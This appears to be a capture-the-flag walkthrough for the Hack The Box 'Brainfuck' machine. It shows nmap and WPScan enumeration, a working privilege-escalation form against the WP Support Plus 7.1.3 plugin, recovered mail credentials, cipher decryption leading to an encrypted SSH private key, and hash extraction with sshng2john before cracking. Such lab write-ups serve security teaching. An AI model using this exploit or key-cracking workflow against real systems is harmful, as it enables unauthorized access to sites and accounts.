#### Brainfuck

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [WPScan](#wpscan)
- [SMTP Enumeration](#smtp-enumeration)
- [Decryption](#decryption)
- [Decrypting ``id_rsa``](#decrypting-id_rsa)

###### Attacker Info

```sh
root@kali:~/brainfuck# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.19  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fef1:8ebf  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:f1:8e:bf  txqueuelen 1000  (Ethernet)
        RX packets 841  bytes 819912 (800.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 450  bytes 61583 (60.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24  bytes 1272 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 1272 (1.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.8  netmask 255.255.254.0  destination 10.10.14.8
        inet6 fe80::bcdb:b8da:bd7:e9a7  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::1006  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2  bytes 96 (96.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~/brainfuck#
```

###### Nmap Scan

```sh
root@kali:~/brainfuck# nmap -sV -sC -oA brainfuck.nmap 10.10.10.17

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-30 11:16 EST
Nmap scan report for 10.10.10.17
Host is up (0.23s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (EdDSA)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=brainfuck
| Not valid before: 2017-04-13T06:48:25
|_Not valid after:  2027-04-11T06:48:25
|_ssl-date: ERROR: Script execution failed (use -d to debug)
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE RESP-CODES PIPELINING CAPA SASL(PLAIN) UIDL USER TOP
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: post-login ENABLE have capabilities IMAP4rev1 LOGIN-REFERRALS listed more Pre-login OK AUTH=PLAINA0001 SASL-IR LITERAL+ IDLE ID
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: ERROR: Script execution failed (use -d to debug)
| tls-nextprotoneg:
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.17 seconds
root@kali:~/brainfuck#
```

![](images/1.png)

![](images/2.png)

![](images/3.png)

```sh
root@kali:~/brainfuck# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali

10.10.10.17	www.brainfuck.htb brainfuck.htb sup3rs3cr3t.brainfuck.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
root@kali:~/brainfuck#
```

```
https://brainfuck.htb 
https://sup3rs3cr3t.brainfuck.htb
```

![](images/4.png)

![](images/5.png)

###### WPScan

```sh
root@kali:~/brainfuck# wpscan -u https://brainfuck.htb --disable-tls-checks --enumerate u
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: https://brainfuck.htb/
[+] Started: Tue Jan 30 12:24:21 2018

[!] The WordPress 'https://brainfuck.htb/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <https://brainfuck.htb/?rest_route=/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: nginx/1.10.0 (Ubuntu)
[+] XML-RPC Interface available under: https://brainfuck.htb/xmlrpc.php

[+] WordPress version 4.7.3 (Released on 2017-03-06) identified from advanced fingerprinting, meta generator, links opml, stylesheets numbers
[!] 20 vulnerabilities identified from the version number

[!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
    Reference: https://wpvulndb.com/vulnerabilities/8807
    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
    Reference: https://core.trac.wordpress.org/ticket/25239
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295

[!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
    Reference: https://wpvulndb.com/vulnerabilities/8815
    Reference: https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066
[i] Fixed in: 4.7.5

[!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
    Reference: https://wpvulndb.com/vulnerabilities/8816
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062
[i] Fixed in: 4.7.5

[!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks
    Reference: https://wpvulndb.com/vulnerabilities/8817
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065
[i] Fixed in: 4.7.5

[!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8818
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
    Reference: https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064
[i] Fixed in: 4.7.5

[!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
    Reference: https://wpvulndb.com/vulnerabilities/8819
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
    Reference: https://hackerone.com/reports/203515
    Reference: https://hackerone.com/reports/203515
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061
[i] Fixed in: 4.7.5

[!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8820
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063
[i] Fixed in: 4.7.5

[!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8905
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
    Reference: https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
[i] Fixed in: 4.7.6

[!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection
    Reference: https://wpvulndb.com/vulnerabilities/8906
    Reference: https://medium.com/websec/wordpress-sqli-bbb2afcc8e94
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
    Reference: https://wpvulndb.com/vulnerabilities/8905
[i] Fixed in: 4.7.5

[!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/8910
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41398
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
[i] Fixed in: 4.7.6

[!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
    Reference: https://wpvulndb.com/vulnerabilities/8911
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41457
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
[i] Fixed in: 4.7.6

[!] Title: WordPress 4.4-4.8.1 - Path Traversal in Customizer
    Reference: https://wpvulndb.com/vulnerabilities/8912
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41397
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722
[i] Fixed in: 4.7.6

[!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed
    Reference: https://wpvulndb.com/vulnerabilities/8913
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41448
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724
[i] Fixed in: 4.7.6

[!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor
    Reference: https://wpvulndb.com/vulnerabilities/8914
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41395
    Reference: https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726
[i] Fixed in: 4.7.6

[!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
    Reference: https://wpvulndb.com/vulnerabilities/8941
    Reference: https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
    Reference: https://twitter.com/ircmaxell/status/923662170092638208
    Reference: https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510
[i] Fixed in: 4.7.7

[!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload
    Reference: https://wpvulndb.com/vulnerabilities/8966
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092
[i] Fixed in: 4.7.8

[!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping
    Reference: https://wpvulndb.com/vulnerabilities/8967
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094
[i] Fixed in: 4.7.8

[!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping
    Reference: https://wpvulndb.com/vulnerabilities/8968
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093
[i] Fixed in: 4.7.8

[!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing
    Reference: https://wpvulndb.com/vulnerabilities/8969
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091
[i] Fixed in: 4.7.8

[!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/9006
    Reference: https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
    Reference: https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/ticket/42720
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
[i] Fixed in: 4.7.9

[+] WordPress theme in use: proficient - v1.0.6

[+] Name: proficient - v1.0.6
 |  Last updated: 2018-01-22T00:00:00.000Z
 |  Location: https://brainfuck.htb/wp-content/themes/proficient/
 |  Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
[!] The version is out of date, the latest version is 1.1.22
 |  Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css
 |  Theme Name: Proficient
 |  Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a p...
 |  Author: Specia
 |  Author URI: https://speciatheme.com/

[+] Detected parent theme: specia - v2.1.1

[+] Name: specia - v2.1.1
 |  Last updated: 2018-01-22T00:00:00.000Z
 |  Location: https://brainfuck.htb/wp-content/themes/specia/
 |  Readme: https://brainfuck.htb/wp-content/themes/specia/readme.txt
[!] The version is out of date, the latest version is 2.2.24
 |  Style URL: https://brainfuck.htb/wp-content/themes/specia/style.css
 |  Theme Name: Specia
 |  Theme URI: https://speciatheme.com/specia-free-wordpress-theme/
 |  Description: Specia is a Multipurpose WordPress theme with lots of powerful features, instantly giving a profe...
 |  Author: Specia
 |  Author URI: https://speciatheme.com/

[+] Enumerating plugins from passive detection ...
 | 1 plugin found:

[+] Name: wp-support-plus-responsive-ticket-system - v7.1.3
 |  Last updated: 2018-01-05T06:04:00.000Z
 |  Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 |  Readme: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
[!] The version is out of date, the latest version is 9.0.2
[!] Directory listing is enabled: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/

[!] Title: WP Support Plus Responsive Ticket System <= 7.1.3 – Authenticated SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8699
    Reference: http://lenonleite.com.br/en/blog/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/
    Reference: https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system
    Reference: https://www.exploit-db.com/exploits/40939/
[i] Fixed in: 8.0.0

[!] Title: WP Support Plus Responsive Ticket System <= 8.0.7 - Remote Code Execution (RCE)
    Reference: https://wpvulndb.com/vulnerabilities/8949
    Reference: https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system
[i] Fixed in: 8.0.8

[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
    +----+---------------+---------------+
    | Id | Login         | Name          |
    +----+---------------+---------------+
    | 1  | admin         | admin         |
    | 2  | administrator | administrator |
    +----+---------------+---------------+
[!] Default first WordPress username 'admin' is still used

[+] Finished: Tue Jan 30 12:24:33 2018
[+] Requests Done: 67
[+] Memory used: 58.586 MB
[+] Elapsed time: 00:00:12
root@kali:~/brainfuck#
```

```sh
root@kali:~/brainfuck# searchsploit WP Support

-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------
WordPress Plugin WP Live Chat Support 6.2.03 - Persistent Cross-Site Scripting                                                                                      | exploits/php/webapps/40190.txt
WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                                                                            | exploits/php/webapps/34589.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                                                                              | exploits/php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                                                                                     | exploits/php/webapps/40939.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------
Shellcodes: No Result
root@kali:~/brainfuck#
```

```sh
root@kali:~/brainfuck# searchsploit -m 41006.txt

  Exploit: WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41006/
     Path: /usr/share/exploitdb/exploits/php/webapps/41006.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /root/brainfuck/41006.txt


root@kali:~/brainfuck#
```

```sh
root@kali:~/brainfuck# cp 41006.txt privesc-wpadmin.html
root@kali:~/brainfuck# nano privesc-wpadmin.html
root@kali:~/brainfuck# cat privesc-wpadmin.html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="orestis@brainfuck.htb">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
root@kali:~/brainfuck#
```

```sh
root@kali:~/brainfuck# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.14.8 - - [30/Jan/2018 12:32:52] "GET / HTTP/1.1" 200 -
10.10.14.8 - - [30/Jan/2018 12:32:52] code 404, message File not found
10.10.14.8 - - [30/Jan/2018 12:32:52] "GET /favicon.ico HTTP/1.1" 404 -
10.10.14.8 - - [30/Jan/2018 12:32:52] code 404, message File not found
10.10.14.8 - - [30/Jan/2018 12:32:52] "GET /favicon.ico HTTP/1.1" 404 -
10.10.14.8 - - [30/Jan/2018 12:32:55] "GET /privesc-wpadmin.html HTTP/1.1" 200 -
```

```
http://10.10.14.8:8000/privesc-wpadmin.html
```

![](images/6.png)

![](images/7.png)

![](images/8.png)

![](images/9.png)

![](images/10.png)

![](images/11.png)

![](images/12.png)

###### SMTP Enumeration

```sh
root@kali:~/brainfuck# apt install evolution
```

```
orestis
kHGuERB29DNiNE
```

![](images/13.png)

![](images/14.png)

![](images/15.png)

![](images/16.png)

![](images/17.png)

![](images/18.png)

![](images/19.png)

![](images/20.png)

![](images/21.png)

![](images/22.png)

![](images/23.png)

```
username: orestis
password: kIEnnfEKJ#9UmdO
```

![](images/24.png)

![](images/25.png)

![](images/26.png)

![](images/27.png)

![](images/28.png)

###### Decryption

```
Orestis - Hacking for fun and profit
Pieagnm - Jkoijeg nbw zwx mle grwsnn
```

[``One time pad``](http://rumkin.com/tools/cipher/otp.php)

```
Brainfuckmybrainfuckmybrainfu
```

![](images/29.png)

[``Keyed Vigenére Cipher``](http://rumkin.com/tools/cipher/vigenere-keyed.php)

![](images/30.png)

```
mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr
```

![](images/31.png)

```
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

![](images/32.png)

###### Decrypting ``id_rsa``

```sh
root@kali:~/brainfuck# ls -l id_rsa
-rw-r--r-- 1 root root 1766 Jan 30 13:15 id_rsa
root@kali:~/brainfuck# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----
root@kali:~/brainfuck#
```

```sh
root@kali:~/brainfuck# wget https://raw.githubusercontent.com/stricture/hashstack-server-plugin-jtr/master/scrapers/sshng2john.py
--2018-01-30 13:20:22--  https://raw.githubusercontent.com/stricture/hashstack-server-plugin-jtr/master/scrapers/sshng2john.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2207 (2.2K) [text/plain]
Saving to: ‘sshng2john.py’

sshng2john.py                                      100%[================================================================================================================>]   2.16K  --.-KB/s    in 0s

2018-01-30 13:20:22 (9.79 MB/s) - ‘sshng2john.py’ saved [5738]

root@kali:~/brainfuck#
```

```sh
root@kali:~/brainfuck# chmod +x sshng2john.py
```

```sh
root@kali:~/brainfuck# ./sshng2john.py id_rsa
16
id_rsa:$sshng$1$16$6904FEF19397786F75BE2D7762AE7382$1200$9a779a83f60263c001f8e2ddae0b722aa9eb7531f09a95864cd5bda5f847b0dcfc09f19d03181c8546877a84e3feb87f0769d2e3ef426012bc211dd5b79168ecfa160428c0030598971f9c2b4c350d7a9adc0f812e5b122342b0b3d8de6ba1a25b599afd5ed6a0927e57824d23bb9f4e143238450eefa3e560d44cf54105f0c00d42624adfb31df44ceee77c09a54a99edd29c83a00cfe8f5584e969897ed220d4fd75129a29ebce8e8a516f210532588fd351fb6656a158f7514667c25d2990cf11fd2369462104ed451037ac592d2e935e74d3ee650092b3051e73b79556dda673666ff4f33d9424c9b914b3cd5ba6a33dd712785a1a63f58e63285415a20fed91ae72fac27cfd92cb15fad802574983f7b592fb5c9d5843de0a9874e8c7a674b4762f5baf04625ebfc8bd84fded869d68c2f33c1e089dc9f302daf381bd76dc000ddb0cabd1e23b33da86dfe4017e16fb7aa6632e8b1f216e2a4fd75d94b39e324effe1c82f8ce60d61594ba3e72e31a2f82bd0b2df236a467be16fe655d399cce773566a0d8e65ae5996cd3bec5bb87bae6f4b2a01221e7f601a0aa23a544a9f915497e0e57da00c1d689850a62c2d2315bc323ac3cf2065bd74d8a0f6938355d0fe8e7572022403046b59923a4fcb4bf98b3b87b4377c045fe36d8156eaba5f60b929686dab085f90e401c63e111de3fbf61e7e9c849d8b3efed7d34f5a0cf814774d54a525c3abbcd9ab232e7d92b295b6e97101e8d5433c489963940d80bde3b4d7bbd040b21d0c2e82ada4844bdc771bbbebe2f4be679f92e484efd581d3323b2013a2bec09aedb16fddce3b9e572a4075962c36ae55a0eac0695ccd56520a0c416e7429ea3a3b48f37867c057098cef65db6ae82684a5b6e6aff8ebfc8be1530ab83c872f91dcf8ebf9bf76d0f74f29f94adfd38769be3f528c1ce7b1c86aa33a20702d547c97029ba725fbdebb18505adeb0f9603a77c76c72215f5241dc06bc7d1921ca7474a2a431566d517f214eabf544e4780a4f06d7333a59ce10a87e8352a1a2dedafb9d8c32ef0c75249e96461a7259d2feb2ef1ff7a2a717b83064bb553fceddf11dee0044599f114ef4cb8e654dbe3c49c35dd48248cbf7a97f45bcf618dce3ca6ecc62032f8cc197b32cd8a9f345e671527019462c767fa207f50f31d757d76277d1851bb70fd1df84d08911548562d316b98e68b69b22a9792fed0911b799f4ee7a0da5c5a8fde05e1331f3104a5106b1d9ec684eb7a8c42239edac41401a9384483f1d30b22103e61d6dfa9b1b5cf8894c0c4c5d2c7583ee69cdb88752862011e9b5d861233713bdb97f32c4d4c16ee395641c38859b1cbd11543ebf8f64838c85c1434f3dbb0ea6929cee0256a52d58fe2fab0ca83c64d5774c86f94c0a88a9046066aa4f0af7cf46998b511427be5cbcf575fdec918945218985b002a943199dfc05a7167c68fb15c2ca17472bae6f8ddaec6b45f438b209b846b85db361c98a8d1e4438e4fb1ec82a40870038c216e79ab6149a6a1f5f8f53c7887c5ce4854634aa819210116466e08fcae8d8393caf4197b0c9df9ac7bdc7388ed91e8cbc0b10e48d26c85f200bc806bb229dda81db4e3e79a2ea10fe8f1bdba71160f2281db59961f4fb1f22090d64af11aa73f29803c2caf466f1ceef6451f84b04200f91574f0190
root@kali:~/brainfuck#
root@kali:~/brainfuck# ./sshng2john.py id_rsa > id_rsa-brainfuck-crack
```

```sh
root@kali:~/brainfuck# cat id_rsa-brainfuck-crack
16
